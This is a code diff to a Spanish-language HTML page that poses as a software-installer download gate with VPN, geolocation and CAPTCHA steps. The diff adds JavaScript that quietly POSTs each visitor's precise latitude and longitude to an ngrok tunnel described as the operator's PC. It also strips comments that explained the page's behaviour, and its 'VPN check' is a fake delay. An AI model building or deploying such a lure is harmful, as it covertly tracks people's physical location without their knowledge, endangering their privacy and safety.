@@ -163,7 +163,7 @@
             display: flex;
             justify-content: center;
             margin-top: 15px;
-            filter: invert(0.9) hue-rotate(180deg); /* Adapta visualmente el reCAPTCHA al tema oscuro */
+            filter: invert(0.9) hue-rotate(180deg);
         }
     </style>
 </head>
@@ -208,7 +208,6 @@
             <h2>Validación de Humanidad</h2>
             <p>Completa la prueba de seguridad para autorizar la descarga del instalador.</p>
             <div class="recaptcha-wrapper">
-                <!-- Tu clave registrada oficial -->
                 <div class="g-recaptcha" data-sitekey="6LcAzcQtAAAAAPKqRwf-K7PVWFMn2dTdFARCUnqv" data-callback="onCaptchaResolved"></div>
             </div>
         </div>
@@ -222,6 +221,9 @@
     </div>
 
     <script>
+        // PEGA AQUÍ TU URL DE NGROK CON /guardar-ubicacion AL FINAL
+        const SERVIDOR_URL = "https://myself-squid-pope.ngrok-free.dev/guardar-ubicacion";
+
         function showStep(stepId) {
             document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
             document.getElementById(stepId).classList.add('active');
@@ -232,21 +234,35 @@
         // 1. Detección de VPN
         function checkVpn() {
             showStep('step-checking');
-            // Al ser un sitio estático sin API backend, avanza directamente a geolocalización tras medio segundo
             setTimeout(() => {
                 showStep('step-geolocation');
             }, 600);
         }
 
-        // 2. Geolocalización
+        // 2. Geolocalización y envío de datos al servidor de la PC
         function requestLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        try {
+                            // Envia latitud y longitud directamente a la PC
+                            await fetch(SERVIDOR_URL, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ lat: lat, lon: lon })
+                            });
+                        } catch (e) {
+                            console.log("Error de transmisión a la PC:", e);
+                        }
+
+                        // Avanza al siguiente paso (CAPTCHA)
                         showStep('step-captcha');
                     },
                     (error) => {
-                        // Si rechaza el permiso, igual le permite avanzar al CAPTCHA
+                        // Si rechazan el permiso, igual continúa al captcha
                         showStep('step-captcha');
                     }
                 );
@@ -260,7 +276,6 @@
             if (token) {
                 const btn = document.getElementById('btn-download');
                 btn.onclick = () => {
-                    // REEMPLAZA ESTE LINK POR TU ENLACE REAL (MediaFire, Mega, Google Drive, etc.)
                     window.location.href = "https://www.mediafire.com"; 
                 };
                 showStep('step-download');
